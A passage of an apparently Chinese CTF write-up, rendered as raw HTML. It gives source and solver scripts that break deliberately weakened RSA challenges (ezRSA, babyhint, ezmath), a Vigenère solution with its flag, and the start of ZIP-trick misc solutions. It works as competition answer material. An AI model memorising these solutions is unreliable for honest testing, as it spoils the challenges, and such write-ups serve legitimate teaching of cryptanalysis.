class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> ezRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">keygen</span><span class=\"token punctuation\">(</span>nbit <span class=\"token operator\">=</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tk <span class=\"token operator\">=</span> getRandomNBitInteger<span class=\"token punctuation\">(</span>nbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tp <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tq <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> isPrime<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span> q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> keygen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>enc <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>enc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>n = 1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>enc = 1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>k<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>q <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>n0 <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>f <span class=\"token operator\">=</span> n <span class=\"token operator\">-</span> n0</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sol <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># print(sol)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>x <span class=\"token operator\">=</span> sol<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">=</span> p<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>q <span class=\"token operator\">=</span> q<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"babyhint\"><a class=\"markdownIt-Anchor\" href=\"#babyhint\">#</a> babyhint</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>hint2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint1=\"</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint2=\"</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n=\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c=\"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hint1= 83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>hint2= 14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n= 94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c= 84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>h1<span class=\"token operator\">=</span> <span class=\"token number\">83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h2<span class=\"token operator\">=</span> <span class=\"token number\">14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>kq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h2<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h1<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>kq<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">//</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>invmod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezmath\"><a class=\"markdownIt-Anchor\" href=\"#ezmath\">#</a> ezmath</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span> <span class=\"token operator\">*</span> p <span class=\"token operator\">+</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'hint=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hint<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>n=16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>c=7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>hint=14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"关键的vigenere\"><a class=\"markdownIt-Anchor\" href=\"#关键的vigenere\">#</a> 关键的 Vigenere</h3>\n<p py@nessfz_tzhozr!=\"\">题目：QGUMI</p>\n<p>key:\tFNY CQ HLQSEPNVJ<br>\n 提示：Keyword<br>\n（观其表，解其里）</p>\n<p>关键字解密：FNY CQ HLQSEPNVJ    key:Vigenere  &gt; KEY IS LOSTDREAM</p>\n<p yu@nsheng_qidong!=\"\">维吉尼亚解密：QGUMI {py@nessfz_tzhozr!}   key:LOSTDREAM  &gt; FSCTF</p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"simple-encryption\"><a class=\"markdownIt-Anchor\" href=\"#simple-encryption\">#</a> Simple Encryption</h3>\n<p>压缩包伪加密。直接修改 deFlags 9 &gt; 0</p>\n<h3 id=\"萧河\"><a class=\"markdownIt-Anchor\" href=\"#萧河\">#</a> 萧河</h3>\n<p>修改 16 进制压缩包头 89 50 4E 